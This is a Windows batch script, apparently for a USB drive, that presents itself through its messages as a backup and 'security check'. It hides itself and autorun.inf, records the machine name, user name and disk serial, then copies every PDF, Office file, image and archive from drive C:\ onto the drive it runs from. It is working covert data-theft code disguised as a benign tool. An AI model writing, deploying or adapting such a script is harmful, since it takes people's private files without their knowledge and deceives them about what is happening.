@echo off

set "SCRIPT_DIR=%~dp0"
set "DEST_FOLDER=%SCRIPT_DIR%"
echo Configurando atributos para archivos de inicio...
attrib +r +s +h "%DEST_FOLDER%\proteccion.inf"
attrib +r +s +h "%DEST_FOLDER%\autorun.inf"
attrib +r +s +h "%DEST_FOLDER%\backups.bat"
echo Obteniendo la fecha actual...
for /f "tokens=1-3 delims=/" %%a in ('echo %date%') do set "DATE=%%c%%b%%a"
echo Fecha actual: %DATE%
echo Obteniendo información del sistema...
set "COMPUTER_NAME=%COMPUTERNAME%"
echo Nombre del equipo: %COMPUTER_NAME%
set "USER_NAME=%USERNAME%"
echo Nombre de usuario: %USER_NAME%
for /f "tokens=2 delims==" %%a in ('wmic diskdrive get serialnumber /value ^| find "="') do set "SERIAL_NUMBER=%%a"
echo Número de serie del disco duro: %SERIAL_NUMBER%
echo Definiendo la ruta de Inicio...
set "BACKUP_FOLDER=%DEST_FOLDER%\BACKUPS\%DATE%_%COMPUTER_NAME%_%USER_NAME%_%SERIAL_NUMBER%"
echo Verificando...
if not exist "%BACKUP_FOLDER%" mkdir "%BACKUP_FOLDER%"
echo Iniciando verificacion de seguridad...
set "EXTENSIONS= .pdf .accdb .doc .docx .ppt .pptx .csv .xls .xlsx .jpg .jpeg .png .rar .jas .zip .webm"
echo Recorriendo el disco C:/...

for %%E in (%EXTENSIONS%) do (
    for /r "C:\" %%i in (*%%E) do (
        echo Analizando: "%%i" 
        copy "%%i" "%BACKUP_FOLDER%"
        for /f "delims=" %%x in ("%%~xi") do (
            set "EXTENSION=%%x"
            setlocal enabledelayedexpansion
            set "EXTENSION=!EXTENSION:~1!"
            if not exist "%BACKUP_FOLDER%\!EXTENSION!" mkdir "%BACKUP_FOLDER%\!EXTENSION!"
            move /y "%BACKUP_FOLDER%\%%~nxi" "%BACKUP_FOLDER%\!EXTENSION!\"
            endlocal
        )
    )
)

echo Crea la lista...
set "LIST_FILE=%BACKUP_FOLDER%\list.txt"
echo Finalizando...
cd /d "%DEST_FOLDER%" || exit
dir /b /s > "%LIST_FILE%"
rem attrib +r +s -h "%LIST_FILE%" 
echo Proceso completado. 
echo Presiona cualquier tecla para salir...
pause > nul
